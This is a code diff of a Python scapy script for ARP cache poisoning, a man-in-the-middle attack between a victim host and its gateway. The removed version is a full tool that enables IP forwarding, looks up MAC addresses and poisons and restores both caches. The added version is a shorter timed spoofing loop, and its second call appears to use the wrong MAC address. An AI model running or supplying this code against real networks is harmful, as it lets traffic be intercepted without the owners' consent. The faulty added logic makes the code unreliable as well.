@@ -1,63 +1,18 @@
 from scapy.all import *
-import sys
-import os
 import time
-from src.config import victimIP, gatewayIP, interface
 
-def help_text():
-    print("\nUsage:\n python hd_tcp_syn.py network_range\n")
-    sys.exit()
 
-def enable_ip_forwarding():
-    print("\n[*] Enabling IP Forwarding...\n")
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-def disable_ip_forwarding():
-    print("[*] Disabling IP Forwarding...")
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+def spoof(target_ip, spoof_ip, target_mac):
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                       psrc=spoof_ip)
+    send(packet, verbose=False)
 
-def get_mac(IP):
-    conf.verb = 0
-    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
-    for snd,rcv in ans:
-        return rcv.sprintf(r"%Ether.src%")
 
-def reARP():
-
-    print("\n[*] Restoring Targets...")
-    victimMAC = get_mac(victimIP)
-    gatewayMAC = get_mac(gatewayIP)
-    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
-    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
-    disable_ip_forwarding()
-    print("[*] Shutting Down...")
-    sys.exit(1)
-
-def trick(gm, vm):
-    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
-    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
-
-def mitm():
-    try:
-        victimMAC = get_mac(victimIP)
-    except Exception:
-        disable_ip_forwarding()
-        print("[!] Couldn't Find Victim MAC Address")
-        print("[!] Exiting...")
-        sys.exit(1)
-    try:
-        gatewayMAC = get_mac(gatewayIP)
-    except Exception:
-        disable_ip_forwarding()
-        print("[!] Couldn't Find Gateway MAC Address")
-        print ("[!] Exiting...")
-        sys.exit(1)
-        print ("[*] Poisoning Targets..." )
-    while 1:
-        try:
-            trick(gatewayMAC, victimMAC)
-            time.sleep(1.5)
-        except KeyboardInterrupt:
-            reARP()
-            break
-
+def run_arps(target_ip, gateway_ip, target_mac, duration):
+    start_time = time.time()
+    end_time = start_time + duration
+    while time.time() < end_time:
+        spoof(target_ip, gateway_ip, target_mac)
+        spoof(gateway_ip, target_ip, target_mac)
+        time.sleep(1)
